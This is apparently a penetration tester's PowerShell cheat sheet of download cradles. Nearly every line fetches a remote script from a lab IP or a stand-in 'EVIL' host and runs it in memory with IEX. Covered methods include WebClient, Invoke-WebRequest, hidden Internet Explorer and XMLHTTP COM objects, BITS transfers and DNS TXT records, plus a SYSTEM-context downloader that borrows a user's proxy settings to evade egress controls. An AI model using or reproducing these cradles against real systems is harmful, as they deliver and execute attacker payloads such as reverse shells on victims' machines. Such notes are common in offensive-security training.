$wc = new-object system.net.WebClient
$wc.proxy = [System.Net.WebRequest]::DefaultWebProxy.GetProxy("http://192.168.49.83/run.txt")
$wc.Headers.Add('User-Agent', "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko")
$wc.DownloadString("http://192.168.49.83/run.txt")




#### Downloader as System


# New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS | Out-Null
# $keys = Get-ChildItem 'HKU:\'
# ForEach ($key in $keys) {
#    if ($key.Name -like "*S-1-5-21-*") {
#        $start = $key.Name.substring(10);
#        break
#    }
# }
# $proxyAddr=(Get-ItemProperty -Path "HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Settings\").ProxyServer[System.net.Webrequest]::DefaultWebProxy = new-object System.Net.WebProxy("http://$proxyAddr")
# $wc = new-object system.net.WebClient
# $wc.DownloadString("http://192.168.49.83/rsh.ps3")


# Iterate over Internet Settings of a User to extract the default proxy configuration. 

New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS | Out-Null; $keys = Get-ChildItem 'HKU:\';ForEach ($key in $keys) {if ($key.Name -like "*S-1-5-21-*") {$start = $key.Name.substring(10);break}};$proxyAddr=(Get-ItemProperty -Path "HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Settings\").ProxyServer;
[system.net.webrequest]::DefaultWebProxy = new-object System.Net.WebProxy("http://$proxyAddr");$wc = new-object system.net.WebClient;$wc.Headers.Add('User-Agent', "This is my agent, there is no one like it...");$wc.DownloadString("http://192.168.119.120/run2.ps1")




# normal download cradle
IEX (New-Object Net.Webclient).downloadstring("http://EVIL/evil.ps1")

# PowerShell 3.0+
IEX (iwr 'http://EVIL/evil.ps1')

# hidden IE com object
$ie=New-Object -comobject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://EVIL/evil.ps1');start-sleep -s 5;$r=$ie.Document.body.innerHTML;$ie.quit();IEX $r

# Msxml2.XMLHTTP COM object
$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://EVIL/evil.ps1',$false);$h.send();iex $h.responseText

# WinHttp COM object (not proxy aware!)
$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://EVIL/evil.ps1',$false);$h.send();iex $h.responseText

# using bitstransfer- touches disk!
Import-Module bitstransfer;Start-BitsTransfer 'http://EVIL/evil.ps1' $env:temp\t;$r=gc $env:temp\t;rm $env:temp\t; iex $r

# DNS TXT approach from PowerBreach (https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerBreach/PowerBreach.ps1)
#   code to execute needs to be a base64 encoded string stored in a TXT record
IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(((nslookup -querytype=txt "SERVER" | Select -Pattern '"*"') -split '"'[0]))))

# from @subtee - https://gist.github.com/subTee/47f16d60efc9f7cfefd62fb7a712ec8d
<#
<?xml version="1.0"?>
<command>
   <a>
      <execute>Get-Process</execute>
   </a>
  </command>
#>
$a = New-Object System.Xml.XmlDocument
$a.Load("https://gist.githubusercontent.com/subTee/47f16d60efc9f7cfefd62fb7a712ec8d/raw/1ffde429dc4a05f7bc7ffff32017a3133634bc36/gistfile1.txt")
$a.command.a.execute | iex

